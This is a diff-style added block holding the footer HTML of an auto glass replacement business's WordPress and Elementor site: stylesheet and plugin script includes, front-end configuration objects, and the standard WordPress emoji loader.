+			<link rel='stylesheet' id='pafe-2669-css' href='https://firstclassautoglassnc.com/wp-content/uploads/premium-addons-elementor/pafe-2669.css?ver=1752173622' media='all' />
+<link rel='stylesheet' id='elementor-post-2669-css' href='https://firstclassautoglassnc.com/wp-content/uploads/elementor/css/post-2669.css?ver=1782574583' media='all' />
+<link rel='stylesheet' id='pafe-2664-css' href='https://firstclassautoglassnc.com/wp-content/uploads/premium-addons-elementor/pafe-2664.css?ver=1752173622' media='all' />
+<link rel='stylesheet' id='elementor-post-2664-css' href='https://firstclassautoglassnc.com/wp-content/uploads/elementor/css/post-2664.css?ver=1782574583' media='all' />
+<link rel='stylesheet' id='pafe-2659-css' href='https://firstclassautoglassnc.com/wp-content/uploads/premium-addons-elementor/pafe-2659.css?ver=1752173622' media='all' />
+<link rel='stylesheet' id='elementor-post-2659-css' href='https://firstclassautoglassnc.com/wp-content/uploads/elementor/css/post-2659.css?ver=1782574584' media='all' />
+<link rel='stylesheet' id='pafe-2654-css' href='https://firstclassautoglassnc.com/wp-content/uploads/premium-addons-elementor/pafe-2654.css?ver=1752173622' media='all' />
+<link rel='stylesheet' id='elementor-post-2654-css' href='https://firstclassautoglassnc.com/wp-content/uploads/elementor/css/post-2654.css?ver=1782574584' media='all' />
+<link rel='stylesheet' id='pafe-2649-css' href='https://firstclassautoglassnc.com/wp-content/uploads/premium-addons-elementor/pafe-2649.css?ver=1752173622' media='all' />
+<link rel='stylesheet' id='elementor-post-2649-css' href='https://firstclassautoglassnc.com/wp-content/uploads/elementor/css/post-2649.css?ver=1782574584' media='all' />
+<link rel='stylesheet' id='pafe-2644-css' href='https://firstclassautoglassnc.com/wp-content/uploads/premium-addons-elementor/pafe-2644.css?ver=1752173622' media='all' />
+<link rel='stylesheet' id='elementor-post-2644-css' href='https://firstclassautoglassnc.com/wp-content/uploads/elementor/css/post-2644.css?ver=1782589486' media='all' />
+<link rel='stylesheet' id='pafe-2639-css' href='https://firstclassautoglassnc.com/wp-content/uploads/premium-addons-elementor/pafe-2639.css?ver=1752173622' media='all' />
+<link rel='stylesheet' id='elementor-post-2639-css' href='https://firstclassautoglassnc.com/wp-content/uploads/elementor/css/post-2639.css?ver=1782574584' media='all' />
+<link rel='stylesheet' id='pafe-697-css' href='https://firstclassautoglassnc.com/wp-content/uploads/premium-addons-elementor/pafe-697.css?ver=1752173622' media='all' />
+<link rel='stylesheet' id='elementor-post-697-css' href='https://firstclassautoglassnc.com/wp-content/uploads/elementor/css/post-697.css?ver=1782574584' media='all' />
+<link rel='stylesheet' id='pafe-689-css' href='https://firstclassautoglassnc.com/wp-content/uploads/premium-addons-elementor/pafe-689.css?ver=1752173622' media='all' />
+<link rel='stylesheet' id='elementor-post-689-css' href='https://firstclassautoglassnc.com/wp-content/uploads/elementor/css/post-689.css?ver=1782574584' media='all' />
+<link rel='stylesheet' id='pafe-629-css' href='https://firstclassautoglassnc.com/wp-content/uploads/premium-addons-elementor/pafe-629.css?ver=1752173622' media='all' />
+<link rel='stylesheet' id='elementor-post-629-css' href='https://firstclassautoglassnc.com/wp-content/uploads/elementor/css/post-629.css?ver=1782574584' media='all' />
+<link rel='stylesheet' id='pafe-625-css' href='https://firstclassautoglassnc.com/wp-content/uploads/premium-addons-elementor/pafe-625.css?ver=1752173622' media='all' />
+<link rel='stylesheet' id='elementor-post-625-css' href='https://firstclassautoglassnc.com/wp-content/uploads/elementor/css/post-625.css?ver=1782574584' media='all' />
+<link rel='stylesheet' id='elementor-post-2046-css' href='https://firstclassautoglassnc.com/wp-content/uploads/elementor/css/post-2046.css?ver=1782574584' media='all' />
+<link rel='stylesheet' id='ep-advanced-divider-css' href='https://firstclassautoglassnc.com/wp-content/plugins/bdthemes-element-pack/assets/css/ep-advanced-divider.css?ver=8.5.1' media='all' />
+<link rel='stylesheet' id='e-popup-css' href='https://firstclassautoglassnc.com/wp-content/plugins/elementor-pro/assets/css/conditionals/popup.min.css?ver=4.1.1' media='all' />
+<script id="ekit-widget-scripts-js" src="https://firstclassautoglassnc.com/wp-content/plugins/elementskit-lite/widgets/init/assets/js/widget-scripts.js?ver=3.9.9"></script>
+<script id="hello-theme-frontend-js" src="https://firstclassautoglassnc.com/wp-content/themes/hello-elementor/assets/js/hello-frontend.js?ver=3.4.9"></script>
+<script id="pafe-2607-js" src="https://firstclassautoglassnc.com/wp-content/uploads/premium-addons-elementor/pafe-2607.js?ver=1752173622"></script>
+<script id="elementor-webpack-runtime-js" src="https://firstclassautoglassnc.com/wp-content/plugins/elementor/assets/js/webpack.runtime.min.js?ver=4.1.4"></script>
+<script id="elementor-frontend-modules-js" src="https://firstclassautoglassnc.com/wp-content/plugins/elementor/assets/js/frontend-modules.min.js?ver=4.1.4"></script>
+<script id="jquery-ui-core-js" src="https://firstclassautoglassnc.com/wp-includes/js/jquery/ui/core.min.js?ver=1.13.3"></script>
+<script id="elementor-frontend-js-extra">
+var PremiumSettings = {"ajaxurl":"https://firstclassautoglassnc.com/wp-admin/admin-ajax.php","nonce":"24d6d442ab"};
+//# sourceURL=elementor-frontend-js-extra
+</script>
+<script id="elementor-frontend-js-before">
+var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false,"isScriptDebug":false},"i18n":{"shareOnFacebook":"Share on Facebook","shareOnTwitter":"Share on Twitter","pinIt":"Pin it","download":"Download","downloadImage":"Download image","fullscreen":"Fullscreen","zoom":"Zoom","share":"Share","playVideo":"Play Video","previous":"Previous","next":"Next","close":"Close","a11yCarouselPrevSlideMessage":"Previous slide","a11yCarouselNextSlideMessage":"Next slide","a11yCarouselFirstSlideMessage":"This is the first slide","a11yCarouselLastSlideMessage":"This is the last slide","a11yCarouselPaginationBulletMessage":"Go to slide"},"is_rtl":false,"breakpoints":{"xs":0,"sm":480,"md":768,"lg":1025,"xl":1440,"xxl":1600},"responsive":{"breakpoints":{"mobile":{"label":"Mobile Portrait","value":767,"default_value":767,"direction":"max","is_enabled":true},"mobile_extra":{"label":"Mobile Landscape","value":880,"default_value":880,"direction":"max","is_enabled":false},"tablet":{"label":"Tablet Portrait","value":1024,"default_value":1024,"direction":"max","is_enabled":true},"tablet_extra":{"label":"Tablet Landscape","value":1200,"default_value":1200,"direction":"max","is_enabled":false},"laptop":{"label":"Laptop","value":1366,"default_value":1366,"direction":"max","is_enabled":false},"widescreen":{"label":"Widescreen","value":2400,"default_value":2400,"direction":"min","is_enabled":false}},"hasCustomBreakpoints":false},"version":"4.1.4","is_static":false,"experimentalFeatures":{"e_font_icon_svg":true,"additional_custom_breakpoints":true,"container":true,"e_panel_promotions":true,"theme_builder_v2":true,"hello-theme-header-footer":true,"nested-elements":true,"global_classes_should_enforce_capabilities":true,"e_variables":true,"e_opt_in_v4_page":true,"e_components":true,"e_interactions":true,"e_widget_creation":true,"import-export-customization":true,"e_pro_atomic_form":true,"e_pro_variables":true,"e_pro_interactions":true},"urls":{"assets":"https:\/\/firstclassautoglassnc.com\/wp-content\/plugins\/elementor\/assets\/","ajaxurl":"https:\/\/firstclassautoglassnc.com\/wp-admin\/admin-ajax.php","uploadUrl":"https:\/\/firstclassautoglassnc.com\/wp-content\/uploads"},"nonces":{"floatingButtonsClickTracking":"2ebd160910","atomicFormsSendForm":"00c095e098"},"swiperClass":"swiper","settings":{"page":{"element_pack_global_tooltip_width":{"unit":"px","size":"","sizes":[]},"element_pack_global_tooltip_width_tablet":{"unit":"px","size":"","sizes":[]},"element_pack_global_tooltip_width_mobile":{"unit":"px","size":"","sizes":[]},"element_pack_global_tooltip_padding":{"unit":"px","top":"","right":"","bottom":"","left":"","isLinked":true},"element_pack_global_tooltip_padding_tablet":{"unit":"px","top":"","right":"","bottom":"","left":"","isLinked":true},"element_pack_global_tooltip_padding_mobile":{"unit":"px","top":"","right":"","bottom":"","left":"","isLinked":true},"element_pack_global_tooltip_border_radius":{"unit":"px","top":"","right":"","bottom":"","left":"","isLinked":true},"element_pack_global_tooltip_border_radius_tablet":{"unit":"px","top":"","right":"","bottom":"","left":"","isLinked":true},"element_pack_global_tooltip_border_radius_mobile":{"unit":"px","top":"","right":"","bottom":"","left":"","isLinked":true}},"editorPreferences":[]},"kit":{"body_background_background":"classic","active_breakpoints":["viewport_mobile","viewport_tablet"],"global_image_lightbox":"yes","lightbox_enable_counter":"yes","lightbox_enable_fullscreen":"yes","lightbox_enable_zoom":"yes","lightbox_enable_share":"yes","lightbox_title_src":"title","lightbox_description_src":"description","hello_header_logo_type":"title","hello_header_menu_layout":"horizontal","hello_footer_logo_type":"logo"},"post":{"id":2607,"title":"Auto%20Glass%20Replacement%20NC%20%7C%20First%20Class%20Auto%20Glass","excerpt":"","featuredImage":false}};
+//# sourceURL=elementor-frontend-js-before
+</script>
+<script id="elementor-frontend-js" src="https://firstclassautoglassnc.com/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=4.1.4"></script>
+<script id="pa-slick-js" src="https://firstclassautoglassnc.com/wp-content/plugins/premium-addons-for-elementor/assets/frontend/min-js/slick.min.js?ver=4.11.82"></script>
+<script id="pa-elements-handler-js" src="https://firstclassautoglassnc.com/wp-content/plugins/premium-addons-for-elementor/assets/frontend/min-js/elements-handler.min.js?ver=4.11.82"></script>
+<script id="gsap-js" src="https://firstclassautoglassnc.com/wp-content/plugins/bdthemes-element-pack/assets/vendor/js/gsap.min.js?ver=3.12.5"></script>
+<script id="lenis-js" src="https://firstclassautoglassnc.com/wp-content/plugins/bdthemes-element-pack/includes/smooth-scroller/assets/lenis.min.js?ver=8.5.1"></script>
+<script id="bdt-smooth-scroller-js" src="https://firstclassautoglassnc.com/wp-content/plugins/bdthemes-element-pack/includes/smooth-scroller/assets/ep-smooth-scroller.js?ver=8.5.1"></script>
+<script id="bdt-uikit-js-extra">
+var element_pack_ajax_login_config = {"ajaxurl":"https://firstclassautoglassnc.com/wp-admin/admin-ajax.php","language":"en","loadingmessage":"Sending user info, please wait...","unknownerror":"Unknown error, make sure access is correct!"};
+var ElementPackConfig = {"ajaxurl":"https://firstclassautoglassnc.com/wp-admin/admin-ajax.php","nonce":"1b4abb8ead","data_table":{"language":{"sLengthMenu":"Show _MENU_ Entries","sInfo":"Showing _START_ to _END_ of _TOTAL_ entries","sSearch":"Search :","sZeroRecords":"No matching records found","oPaginate":{"sPrevious":"Previous","sNext":"Next"}}},"contact_form":{"sending_msg":"Sending message please wait...","captcha_nd":"Invisible captcha not defined!","captcha_nr":"Could not get invisible captcha response!"},"mailchimp":{"subscribing":"Subscribing you please wait..."},"search":{"more_result":"More Results","search_result":"SEARCH RESULT","not_found":"not found"},"words_limit":{"read_more":"[read more]","read_less":"[read less]"},"elements_data":{"sections":[],"columns":[],"widgets":[]}};
+//# sourceURL=bdt-uikit-js-extra
+</script>
+<script id="bdt-uikit-js" src="https://firstclassautoglassnc.com/wp-content/plugins/bdthemes-element-pack/assets/js/bdt-uikit.min.js?ver=3.21.7"></script>
+<script id="element-pack-helper-js" src="https://firstclassautoglassnc.com/wp-content/plugins/bdthemes-element-pack/assets/js/common/helper.min.js?ver=8.5.1"></script>
+<script id="prime-slider-site-js" src="https://firstclassautoglassnc.com/wp-content/plugins/bdthemes-prime-slider-lite/assets/js/prime-slider-site.min.js?ver=4.4.1"></script>
+<script id="pafe-2669-js" src="https://firstclassautoglassnc.com/wp-content/uploads/premium-addons-elementor/pafe-2669.js?ver=1752173622"></script>
+<script id="event-move-js" src="https://firstclassautoglassnc.com/wp-content/plugins/premium-addons-pro/assets/frontend/min-js/event-move.min.js?ver=2.9.42"></script>
+<script id="pa-imgcompare-js" src="https://firstclassautoglassnc.com/wp-content/plugins/premium-addons-pro/assets/frontend/min-js/imgcompare.min.js?ver=2.9.42"></script>
+<script id="imagesloaded-js" src="https://firstclassautoglassnc.com/wp-includes/js/imagesloaded.min.js?ver=5.0.0"></script>
+<script id="pafe-2664-js" src="https://firstclassautoglassnc.com/wp-content/uploads/premium-addons-elementor/pafe-2664.js?ver=1752173622"></script>
+<script id="pafe-2659-js" src="https://firstclassautoglassnc.com/wp-content/uploads/premium-addons-elementor/pafe-2659.js?ver=1752173622"></script>
+<script id="pafe-2654-js" src="https://firstclassautoglassnc.com/wp-content/uploads/premium-addons-elementor/pafe-2654.js?ver=1752173622"></script>
+<script id="pafe-2649-js" src="https://firstclassautoglassnc.com/wp-content/uploads/premium-addons-elementor/pafe-2649.js?ver=1752173622"></script>
+<script id="pafe-2644-js" src="https://firstclassautoglassnc.com/wp-content/uploads/premium-addons-elementor/pafe-2644.js?ver=1752173622"></script>
+<script id="premium-pro-js-extra">
+var PremiumProSettings = {"ajaxurl":"https://firstclassautoglassnc.com/wp-admin/admin-ajax.php","nonce":"c4b230d1f3","magicSection":""};
+//# sourceURL=premium-pro-js-extra
+</script>
+<script id="premium-pro-js" src="https://firstclassautoglassnc.com/wp-content/plugins/premium-addons-pro/assets/frontend/min-js/premium-addons.min.js?ver=2.9.42"></script>
+<script id="pafe-2639-js" src="https://firstclassautoglassnc.com/wp-content/uploads/premium-addons-elementor/pafe-2639.js?ver=1752173622"></script>
+<script id="pafe-697-js" src="https://firstclassautoglassnc.com/wp-content/uploads/premium-addons-elementor/pafe-697.js?ver=1752173622"></script>
+<script id="pafe-689-js" src="https://firstclassautoglassnc.com/wp-content/uploads/premium-addons-elementor/pafe-689.js?ver=1752173622"></script>
+<script id="pafe-629-js" src="https://firstclassautoglassnc.com/wp-content/uploads/premium-addons-elementor/pafe-629.js?ver=1752173622"></script>
+<script id="pafe-625-js" src="https://firstclassautoglassnc.com/wp-content/uploads/premium-addons-elementor/pafe-625.js?ver=1752173622"></script>
+<script id="ep-advanced-divider-js" src="https://firstclassautoglassnc.com/wp-content/plugins/bdthemes-element-pack/assets/js/modules/ep-advanced-divider.min.js?ver=8.5.1"></script>
+<script id="elementor-pro-webpack-runtime-js" src="https://firstclassautoglassnc.com/wp-content/plugins/elementor-pro/assets/js/webpack-pro.runtime.min.js?ver=4.1.1"></script>
+<script id="wp-hooks-js" src="https://firstclassautoglassnc.com/wp-includes/js/dist/hooks.min.js?ver=7496969728ca0f95732d"></script>
+<script id="wp-i18n-js" src="https://firstclassautoglassnc.com/wp-includes/js/dist/i18n.min.js?ver=781d11515ad3d91786ec"></script>
+<script id="wp-i18n-js-after">
+wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
+//# sourceURL=wp-i18n-js-after
+</script>
+<script id="elementor-pro-frontend-js-before">
+var ElementorProFrontendConfig = {"ajaxurl":"https:\/\/firstclassautoglassnc.com\/wp-admin\/admin-ajax.php","nonce":"e4957ccae6","urls":{"assets":"https:\/\/firstclassautoglassnc.com\/wp-content\/plugins\/elementor-pro\/assets\/","rest":"https:\/\/firstclassautoglassnc.com\/wp-json\/"},"settings":{"lazy_load_background_images":true},"popup":{"hasPopUps":true},"shareButtonsNetworks":{"facebook":{"title":"Facebook","has_counter":true},"twitter":{"title":"Twitter"},"linkedin":{"title":"LinkedIn","has_counter":true},"pinterest":{"title":"Pinterest","has_counter":true},"reddit":{"title":"Reddit","has_counter":true},"vk":{"title":"VK","has_counter":true},"odnoklassniki":{"title":"OK","has_counter":true},"tumblr":{"title":"Tumblr"},"digg":{"title":"Digg"},"skype":{"title":"Skype"},"stumbleupon":{"title":"StumbleUpon","has_counter":true},"mix":{"title":"Mix"},"telegram":{"title":"Telegram"},"pocket":{"title":"Pocket","has_counter":true},"xing":{"title":"XING","has_counter":true},"whatsapp":{"title":"WhatsApp"},"email":{"title":"Email"},"print":{"title":"Print"},"x-twitter":{"title":"X"},"threads":{"title":"Threads"}},"facebook_sdk":{"lang":"en_US","app_id":""},"lottie":{"defaultAnimationUrl":"https:\/\/firstclassautoglassnc.com\/wp-content\/plugins\/elementor-pro\/modules\/lottie\/assets\/animations\/default.json"}};
+//# sourceURL=elementor-pro-frontend-js-before
+</script>
+<script id="elementor-pro-frontend-js" src="https://firstclassautoglassnc.com/wp-content/plugins/elementor-pro/assets/js/frontend.min.js?ver=4.1.1"></script>
+<script id="pro-elements-handlers-js" src="https://firstclassautoglassnc.com/wp-content/plugins/elementor-pro/assets/js/elements-handlers.min.js?ver=4.1.1"></script>
+<script id="powerpack-frontend-js-extra">
+var ppLogin = {"empty_username":"Enter a username or email address.","empty_password":"Enter password.","empty_password_1":"Enter a password.","empty_password_2":"Re-enter password.","empty_recaptcha":"Please check the captcha to verify you are not a robot.","email_sent":"A password reset email has been sent to the email address for your account, but may take several minutes to show up in your inbox. Please wait at least 10 minutes before attempting another reset.","reset_success":"Your password has been reset successfully.","ajax_url":"https://firstclassautoglassnc.com/wp-admin/admin-ajax.php","show_password":"Show password","hide_password":"Hide password"};
+var ppRegistration = {"invalid_username":"This username is invalid because it uses illegal characters. Please enter a valid username.","username_exists":"This username is already registered. Please choose another one.","empty_email":"Please type your email address.","invalid_email":"The email address isn\u2019t correct!","email_exists":"The email is already registered, please choose another one.","password":"Password must not contain the character \"\\\\\"","password_length":"Your password should be at least 8 characters long.","password_mismatch":"Password does not match.","invalid_url":"URL seems to be invalid.","recaptcha_php_ver":"reCAPTCHA API requires PHP version 5.3 or above.","recaptcha_missing_key":"Your reCAPTCHA Site or Secret Key is missing!","show_password":"Show password","hide_password":"Hide password","ajax_url":"https://firstclassautoglassnc.com/wp-admin/admin-ajax.php"};
+var ppCoupons = {"copied_text":"Copied"};
+//# sourceURL=powerpack-frontend-js-extra
+</script>
+<script id="powerpack-frontend-js" src="https://firstclassautoglassnc.com/wp-content/plugins/powerpack-elements/assets/js/min/frontend.min.js?ver=2.10.17"></script>
+<script id="pp-tooltipster-js" src="https://firstclassautoglassnc.com/wp-content/plugins/powerpack-elements/assets/lib/tooltipster/tooltipster.min.js?ver=2.10.17"></script>
+<script id="wp-emoji-settings" type="application/json">
+{"baseUrl":"https://s.w.org/images/core/emoji/17.0.2/72x72/","ext":".png","svgUrl":"https://s.w.org/images/core/emoji/17.0.2/svg/","svgExt":".svg","source":{"concatemoji":"https://firstclassautoglassnc.com/wp-includes/js/wp-emoji-release.min.js?ver=7.0"}}
+</script>
+<script type="module">
+/*! This file is auto-generated */
+const a=JSON.parse(document.getElementById("wp-emoji-settings").textContent),o=(window._wpemojiSettings=a,"wpEmojiSettingsSupports"),s=["flag","emoji"];function i(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function c(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data);e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0);const a=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data);return t.every((e,t)=>e===a[t])}function p(e,t){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var n=e.getImageData(16,16,1,1);for(let e=0;e<n.data.length;e++)if(0!==n.data[e])return!1;return!0}function u(e,t,n,a){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\udde8\ud83c\uddf6","\ud83c\udde8\u200b\ud83c\uddf6")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!a(e,"\ud83e\u1fac8")}return!1}function f(e,t,n,a){let r;const o=(r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):document.createElement("canvas")).getContext("2d",{willReadFrequently:!0}),s=(o.textBaseline="top",o.font="600 32px Arial",{});return e.forEach(e=>{s[e]=t(o,e,n,a)}),s}function r(e){var t=document.createElement("script");t.src=e,t.defer=!0,document.head.appendChild(t)}a.supports={everything:!0,everythingExceptFlag:!0},new Promise(t=>{let n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),c.toString(),p.toString()].join(",")+"));",a=new Blob([e],{type:"text/javascript"});const r=new Worker(URL.createObjectURL(a),{name:"wpTestEmojiSupports"});return void(r.onmessage=e=>{i(n=e.data),r.terminate(),t(n)})}catch(e){}i(n=f(s,u,c,p))}t(n)}).then(e=>{for(const n in e)a.supports[n]=e[n],a.supports.everything=a.supports.everything&&a.supports[n],"flag"!==n&&(a.supports.everythingExceptFlag=a.supports.everythingExceptFlag&&a.supports[n]);var t;a.supports.everythingExceptFlag=a.supports.everythingExceptFlag&&!a.supports.flag,a.supports.everything||((t=a.source||{}).concatemoji?r(t.concatemoji):t.wpemoji&&t.twemoji&&(r(t.twemoji),r(t.wpemoji)))});
+//# sourceURL=https://firstclassautoglassnc.com/wp-includes/js/wp-emoji-loader.min.js
+</script>
+	</body>
+</html>
+
+<!-- Cached by WP-Optimize (gzip) - https://teamupdraft.com/wp-optimize/ - Last modified: June 28, 2026 2:48 pm (UTC:-5) -->
